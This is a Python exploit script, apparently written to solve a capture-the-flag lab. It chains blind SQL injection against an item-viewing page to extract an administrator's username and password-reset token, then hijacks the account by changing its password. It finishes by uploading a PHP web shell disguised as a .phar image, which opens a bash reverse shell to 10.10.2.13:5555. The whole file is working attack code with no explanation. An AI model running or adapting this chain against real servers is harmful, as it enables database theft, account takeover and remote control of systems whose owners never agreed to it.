import requests, argparse, sys

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', required=True, dest='target', help='Target URL')
parser.add_argument('--pass', '-p', required=True, dest='passwd', help='Password for changing')
args = parser.parse_args()

s = requests.session()

# Run script 2x :/ biar jalan req fpass nya
def req_fpass(target, user):
    url = f"http://{target}/login/resetPassword.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"username={user}"
    r = requests.post(url, headers=header, data=data, allow_redirects=True)
    if r.status_code == 302:
        print("[+] Done Request Token")
    else:
        print("[-] Something Wrong")

def sqli_retLen(target, inj):
    len = 0
    for i in range(1, 51):
        payload = f"1 AND length((select {inj} from user where id_level=1 LIMIT 1))={i}"
        url = f"http://{target}/item/viewItem.php?id={payload}"
        r = requests.get(url, allow_redirects=False)
        if r.status_code == 404:
            len = i
            break
    return len

def sqli_retToken(target, inj):
    for i in range(32, 127):
        payload = inj.replace("[CHAR]", str(i))
        url = f"http://{target}/item/viewItem.php?id={payload}"
        r = requests.get(url, allow_redirects=False)
        if r.status_code == 404:
            return i
    return None

def sqli(target, r, inj):
    extracted = ""
    for i in range(1, r+1):
        payload = "1 AND ascii(substring((select %s from user where id_level=1 LIMIT 1),%d,1))=[CHAR]" % (inj, i)
        char_val = sqli_retToken(target, payload)
        if char_val:
            extracted += chr(char_val)
            out_extracted = chr(char_val)
            sys.stdout.write(out_extracted)
            sys.stdout.flush()
        else:
            break
    return extracted

def change_pass(target, token, passwd):
    url = f"http://{target}/login/doChangePassword.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"token={token}&password={passwd}"
    r = requests.post(url, headers=header, data=data, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Done Change Password with " + passwd)
    else:
        print("[-] Something wrong")

def login(target, uname, passwd):
    url = f"http://{target}/login/checkLogin.php"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"username={uname}&password={passwd}"
    r = s.post(url, headers=header, data=data)
    if "FLAG1" in r.text:
        print("[+] Success Login")
    else:
        print("[-] Something wrong")

def upload_shell(target):
    url = f"http://{target}/item/updateItem.php"
    boundary = '-------ARDIAS'
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.2.13/5555 0>&1'\"); ?>"
    data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="id"\r\n\r\n'
        f'1\r\n--{boundary}\r\n'
        f'Content-Disposition: form-data; name="id_user"\r\n\r\n'
        f'1\r\n--{boundary}\r\n'
        f'Content-Disposition: form-data; name="name\r\n\r\n'
        f'pwneD\r\n--{boundary}\r\n'
        f'Content-Disposition: form-data; name="image"; filename="shellq.phar"\r\n'
        f'Content-Type: application/x-phar\r\n\r\n'
        f'{payload}\r\n--{boundary}\r\n'
        f'Content-Disposition: form-data; name="description"\r\n\r\n'
        f'getPWNED\r\n--{boundary}\r\n'
        f'Content-Disposition: form-data; name="price"\r\n\r\n'
        f'69\r\n--{boundary}\r\n'
    )
    r = s.post(url, headers=headers, data=data)
    print("[+] Done")

def triggering_shell(target):
    url = f"http://{target}/item/image/shellq.phar"
    requests.get(url)
    print("[+] Done")

def main():
    try:
        target = args.target
        passwd = args.passwd
    except IndexError:
        print("[i] Usage: python3 %s -t TARGET" % sys.argv[0])
        print("[i] ex: python3 %s -t 127.0.0.1:8080" % sys.argv[0])

    print("[*] Retrieve Length Username")
    len_uname = sqli_retLen(target, "username")
    print("[+] Username Length: " + str(len_uname))

    print("[*] Retrieve Length Token")
    len_token = sqli_retLen(target, "token")
    print("[+] Token Length: " + str(len_token))

    print("[*] Dump Username")
    username = sqli(target, len_uname, "username")
    print("\n[+] Username: " + username)

    print("[*] Requesting Token")
    req_fpass(target, username)

    print("[*] Dump token for user " + username)
    token = sqli(target, len_token, "token")
    print("\n[+] Token: " + token)

    print("[*] Change Password")
    change_pass(target, token, passwd)

    print("[*] Login ...")
    login(target, username, passwd)

    print("[*] Uploading Shell ...")
    upload_shell(target)

    print("[i] Triggering Shell, check your netcat ...")
    triggering_shell(target)

if __name__ == "__main__":
    main()